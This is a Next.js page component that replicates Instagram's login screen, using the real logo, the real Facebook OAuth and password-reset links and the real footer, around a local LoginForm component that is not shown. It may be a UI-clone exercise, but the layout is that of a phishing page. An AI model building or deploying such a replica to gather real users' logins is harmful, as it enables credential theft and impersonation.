import LoginForm from '@/components/LoginForm';

export default function Home() {
  return (
    <div className="min-h-screen bg-[#fafafa] flex flex-col items-center text-[#262626] p-4 w-full">
      <div className="login-container">
        <div className="login-box">
          <div className="logo">
            <img 
              src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" 
              alt="Instagram" 
            />
          </div>
          
          <LoginForm />
          
          <div className="divider">OR</div>
          
          <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATknmvA1Y1GX4tX3C_RL16dZPdzFpItoSnWuUyOTRh72I8R6pLoohF038PZI3AH9-CxZuu67Bn-3HiJqsDrAu-dmxEl95xX0NPHahZkJML47l4eT1UrCjAF4PW7iG5eeI8dVJ-8G1lxQvbQS4hOh3G5sGHrL4s91fEyMX4Crfe56Bws11zXukBNyXRHTbiCkV1WdApr9OnkCDwTbXZV4GdTIcxs3XDK4Y-vVhdWEJT2sI4T2zTrf5PoH5jjoU6EY2IZ4" className="facebook-login">
            <span className="facebook-icon"></span>
            Log in with Facebook
          </a>
          <a href="https://www.instagram.com/accounts/password/reset/" className="forgot-pw">
            Forgot password?
          </a>
        </div>
        
        <div className="signup-box">
          Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" className="signup-link">Sign up</a>
        </div>
        
        <div className="app-section">
          <p>Get the app.</p>
          <div className="app-badges">
            <a href="https://apps.apple.com/us/app/instagram/id389801252">
              <img 
                src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" 
                alt="Download on the App Store" 
              />
            </a>
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D7A744087-46CA-4803-BEEB-866C6322A2F7%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge">
              <img 
                src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" 
                alt="GET IT ON Google Play" 
              />
            </a>
          </div>
        </div>
      </div>
      
      <div className="footer-links">
        {[
          { name: "Meta", href: "https://www.meta.com/about/?utm_source=about.meta.com&utm_medium=redirect" },
          { name: "About", href: "https://about.instagram.com/" },
          { name: "Blog", href: "https://about.instagram.com/blog" },
          { name: "Jobs", href: "https://about.instagram.com/about-us/careers" },
          { name: "Help", href: "https://help.instagram.com/" },
          { name: "API", href: "https://developers.facebook.com/docs/instagram-platform" },
          { name: "Privacy", href: "https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect" },
          { name: "Terms", href: "https://help.instagram.com/581066165581870/" },
          { name: "Locations", href: "https://www.instagram.com/explore/locations/" },
          { name: "Instagram Lite", href: "https://www.instagram.com/web/lite/" },
          { name: "Threads", href: "https://www.threads.com/" },
          { name: "Contact Uploading & Non-Users", href: "https://www.facebook.com/help/instagram/261704639352628" },
          { name: "Meta Verified", href: "https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fmeta_verified%2F%3Fentrypoint%3Dweb_footer%26__coig_login%3D1#" }
        ].map((link, index) => (
          <a key={index} href={link.href} className="hover:underline" target="_blank" rel="noopener noreferrer">
            {link.name}
          </a>
        ))}
      </div>
      
      <div className="copyright">
        <div className="language-selector">
          <span>English</span>
          <span className="language-arrow">▾</span>
        </div>
        <div>© 2025 Instagram from Meta</div>
      </div>
    </div>
  );
}